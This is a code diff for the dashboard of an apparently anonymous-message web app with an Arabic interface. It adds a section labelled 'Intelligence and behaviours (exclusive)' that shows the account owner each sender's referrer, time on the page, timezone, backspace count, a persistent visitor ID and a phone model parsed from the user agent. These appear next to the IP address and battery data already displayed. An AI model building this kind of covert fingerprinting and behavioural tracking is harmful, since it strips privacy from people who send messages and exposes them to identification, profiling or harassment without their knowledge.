@@ -10,6 +10,17 @@ import DeleteMessageButton from "./DeleteMessageButton";
 import SettingsForm from "./SettingsForm";
 import PublicReplyForm from "./PublicReplyForm";
 
+function extractPhoneModel(ua) {
+  if (!ua) return "";
+  if (/iPhone/i.test(ua)) return " (iPhone)";
+  if (/iPad/i.test(ua)) return " (iPad)";
+  const android = ua.match(/Android [^;]+; ([^;)]+)\)?/);
+  if (android && android[1]) {
+    return " (" + android[1].split(" Build")[0].trim() + ")";
+  }
+  return "";
+}
+
 export default async function Dashboard() {
   const cookieStore = await cookies();
   const token = cookieStore.get("auth_token")?.value;
@@ -113,8 +124,15 @@ export default async function Dashboard() {
                   <div><strong>🌍 IP Address:</strong> <br/>{msg.ipAddress}</div>
                   <div><strong>🌐 المتصفح:</strong> <br/>{msg.userAgent?.substring(0, 40)}...</div>
                   
+                  <div style={{ gridColumn: "span 2", borderBottom: "1px solid rgba(255,255,255,0.1)", paddingBottom: "0.5rem", marginBottom: "0.5rem", marginTop: "0.5rem", color: "var(--accent-color)", fontWeight: "bold" }}>🕵️ استخبارات وسلوكيات (حصري)</div>
+                  <div><strong>🔗 المصدر (الرابط):</strong> <br/>{msg.referrer && msg.referrer !== "Direct" ? msg.referrer : "دخول مباشر"}</div>
+                  <div><strong>⏱️ الثواني بالصفحة:</strong> <br/>{msg.timeSpent ? `${msg.timeSpent} ثانية` : "غير متاح"}</div>
+                  <div><strong>🕒 التايم زون (المنطقة الزمنية):</strong> <br/>{msg.timezone || "غير متاح"}</div>
+                  <div><strong>🔙 مسح وتعديل الكتابة:</strong> <br/>{msg.backspacesCount ? `${msg.backspacesCount} مرة` : "لا يوجد"}</div>
+                  <div style={{ gridColumn: "span 2" }}><strong>🍪 كود هوية الزائر (لمعرفة التكرار):</strong> <br/><span style={{ background:"rgba(255,255,255,0.1)", padding:"2px 6px", borderRadius:"4px", fontFamily:"monospace" }}>{msg.sessionId || "غير متاح"}</span></div>
+                  
                   <div style={{ gridColumn: "span 2", borderBottom: "1px solid rgba(255,255,255,0.1)", paddingBottom: "0.5rem", marginBottom: "0.5rem", marginTop: "0.5rem", color: "var(--accent-color)", fontWeight: "bold" }}>🖥️ مواصفات الجهاز</div>
-                  <div><strong>📱 الجهاز:</strong> <br/>{msg.deviceType}</div>
+                  <div><strong>📱 الجهاز:</strong> <br/>{msg.deviceType}{extractPhoneModel(msg.userAgent)}</div>
                   <div><strong>🔋 البطارية:</strong> <br/>{msg.batteryInfo || "غير متاح"}</div>
                   <div><strong>🖥️ الشاشة:</strong> <br/>{msg.screenResolution || "غير متاح"}</div>
                   <div><strong>👆 دعم اللمس:</strong> <br/>{msg.isTouch || "غير متاح"}</div>
